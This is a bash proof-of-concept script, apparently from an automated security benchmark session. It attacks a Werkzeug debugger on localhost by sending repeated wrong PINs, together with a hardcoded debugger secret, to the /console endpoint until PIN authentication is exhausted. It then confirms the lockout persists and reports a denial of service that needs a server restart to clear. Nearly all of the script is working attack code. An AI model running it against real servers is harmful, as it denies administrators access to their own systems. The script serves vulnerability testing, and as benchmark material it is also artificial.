#!/bin/bash
# POC: Demonstrates permanent PIN exhaustion in Werkzeug debugger after multiple failed attempts
# Target: ./repo
# Created: 2025-10-31T16:54:48.683Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "================================================"
echo "Werkzeug Debugger PIN Exhaustion POC"
echo "================================================"
echo ""

TARGET="http://localhost:8080"
SECRET="DDsqfqhzsd3B1gq3VL9h"

echo "[*] Testing Werkzeug debugger PIN authentication exhaustion"
echo "[*] Target: $TARGET"
echo ""

# Function to test PIN auth
test_pin_auth() {
    local pin=$1
    local attempt=$2
    
    response=$(curl -s "$TARGET/console?__debugger__=yes&cmd=pinauth&pin=$pin&s=$SECRET")
    
    echo "Attempt $attempt - PIN: $pin"
    echo "Response: $response"
    
    # Check if exhausted
    if echo "$response" | grep -q '"exhausted": true'; then
        echo "[!] PIN authentication EXHAUSTED - lockout activated"
        return 1
    elif echo "$response" | grep -q '"exhausted": false'; then
        echo "[+] PIN authentication still available"
        return 0
    else
        echo "[?] Unexpected response format"
        return 2
    fi
    echo ""
}

echo "=== Phase 1: Attempting multiple incorrect PINs ==="
echo ""

# Try multiple incorrect PINs to exhaust the limit
attempt=1
exhausted=false

for i in {1..15}; do
    pin=$(printf "%03d-%03d-%03d" $i $i $i)
    
    if ! test_pin_auth "$pin" "$attempt"; then
        exhausted=true
        exhausted_at=$attempt
        break
    fi
    
    attempt=$((attempt + 1))
    sleep 0.5
done

echo ""

if [ "$exhausted" = true ]; then
    echo "=== Phase 2: Verifying permanent lockout ==="
    echo ""
    echo "[!] PIN authentication exhausted after $exhausted_at attempts"
    echo "[*] Testing if lockout persists with different PINs..."
    echo ""
    
    # Try a few more attempts to confirm lockout is permanent
    for i in {20..23}; do
        pin=$(printf "%03d-%03d-%03d" $i $i $i)
        response=$(curl -s "$TARGET/console?__debugger__=yes&cmd=pinauth&pin=$pin&s=$SECRET")
        echo "Post-exhaustion attempt - PIN: $pin"
        echo "Response: $response"
        
        if echo "$response" | grep -q '"exhausted": true'; then
            echo "[!] Lockout persists - legitimate access denied"
        fi
        echo ""
    done
    
    echo "=== Summary ==="
    echo "[VULNERABLE] PIN authentication permanently exhausted"
    echo "[IMPACT] Denial of Service - legitimate administrators cannot access debugger"
    echo "[IMPACT] No recovery mechanism - requires server restart"
    echo ""
    echo "Vulnerability confirmed: Werkzeug debugger PIN can be permanently exhausted"
    exit 0
else
    echo "[?] PIN exhaustion threshold not reached in 15 attempts"
    echo "[*] The application may have different rate limiting configuration"
    exit 1
fi